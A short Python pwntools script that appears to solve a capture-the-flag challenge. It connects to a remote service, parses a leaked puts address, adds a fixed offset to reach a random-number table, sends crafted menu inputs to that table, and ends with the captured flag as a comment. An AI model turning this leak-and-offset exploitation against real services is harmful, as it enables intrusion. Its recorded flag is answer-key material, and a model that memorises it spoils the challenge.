from pwn import *

if __name__ == '__main__':
    p = remote("51.250.81.57", "1336")
    p.sendline(b"3")
    p.sendline(b"no")
    p.recvuntil(b"**")
    putsaddr = p.recvline()
    putsaddr = putsaddr[2:-2]
    print(putsaddr)
    randtblAddr = int(putsaddr.decode("utf-8"), base=16)
    randtblAddr += 3581728
    for i in range(32 * 4):
        p.sendline(b"2")
        p.sendline(hex(randtblAddr + i).encode("utf-8"))
        print(hex(randtblAddr + i))
    for i in range(10):
        p.sendline(b"1")
    print(p.recvall(10).decode("utf-8"))

# Ararat{h5Ck3D_r4Nd0M_345y_F14G_NuLl_00000}